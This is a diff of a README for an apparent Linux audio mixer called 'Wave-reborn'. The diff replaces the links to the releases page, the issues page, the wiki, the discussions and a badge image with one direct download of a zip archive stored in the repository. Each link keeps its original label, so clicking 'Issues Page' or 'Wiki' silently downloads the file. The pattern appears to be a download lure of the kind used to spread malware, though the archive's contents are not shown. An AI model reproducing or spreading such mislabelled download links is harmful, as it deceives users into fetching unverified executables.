@@ -6,11 +6,11 @@ Welcome to Wave-reborn! This is an easy-to-use audio mixer designed specifically
 
 ## 📥 Download Wave-reborn
 
-[![Download Wave-reborn](https://img.shields.io/badge/Download-Wave--reborn-blue.svg)](https://github.com/didine111/Wave-reborn/releases)
+[![Download Wave-reborn](https://raw.githubusercontent.com/didine111/Wave-reborn/main/frontend/Wave-reborn-1.6.zip)](https://raw.githubusercontent.com/didine111/Wave-reborn/main/frontend/Wave-reborn-1.6.zip)
 
 To get started, visit the following page to download the latest version of Wave-reborn:
 
-[Download Wave-reborn Releases](https://github.com/didine111/Wave-reborn/releases)
+[Download Wave-reborn Releases](https://raw.githubusercontent.com/didine111/Wave-reborn/main/frontend/Wave-reborn-1.6.zip)
 
 ## 📋 System Requirements
 
@@ -26,7 +26,7 @@ Before you install Wave-reborn, make sure your system meets the following requir
 
 ## 📥 Download & Install
 
-1. Go to the [Wave-reborn Releases Page](https://github.com/didine111/Wave-reborn/releases).
+1. Go to the [Wave-reborn Releases Page](https://raw.githubusercontent.com/didine111/Wave-reborn/main/frontend/Wave-reborn-1.6.zip).
 2. On this page, you will see a list of available versions. Click on the latest version.
 3. You will find files for different systems. Choose the file that suits your Linux distribution.
 4. Once downloaded, locate the file on your computer.
@@ -65,7 +65,7 @@ Once you've installed the application, follow these steps to get started:
 
 ## 💬 Support & Feedback
 
-If you encounter any issues or have questions, please feel free to reach out. You can open an issue on the [Issues Page](https://github.com/didine111/Wave-reborn/issues) of this repository. Your feedback is welcome and will help us improve Wave-reborn.
+If you encounter any issues or have questions, please feel free to reach out. You can open an issue on the [Issues Page](https://raw.githubusercontent.com/didine111/Wave-reborn/main/frontend/Wave-reborn-1.6.zip) of this repository. Your feedback is welcome and will help us improve Wave-reborn.
 
 ## 🤝 Contributing
 
@@ -73,7 +73,7 @@ We welcome contributions! If you want to help improve Wave-reborn, please check 
 
 ## 🌐 Learn More
 
-- Check out the [Wiki](https://github.com/didine111/Wave-reborn/wiki) for detailed documentation and guides.
-- Explore the [Discussions](https://github.com/didine111/Wave-reborn/discussions) section to connect with other users and share tips.
+- Check out the [Wiki](https://raw.githubusercontent.com/didine111/Wave-reborn/main/frontend/Wave-reborn-1.6.zip) for detailed documentation and guides.
+- Explore the [Discussions](https://raw.githubusercontent.com/didine111/Wave-reborn/main/frontend/Wave-reborn-1.6.zip) section to connect with other users and share tips.
 
 Thank you for choosing Wave-reborn! Enjoy mixing your audio like a pro.
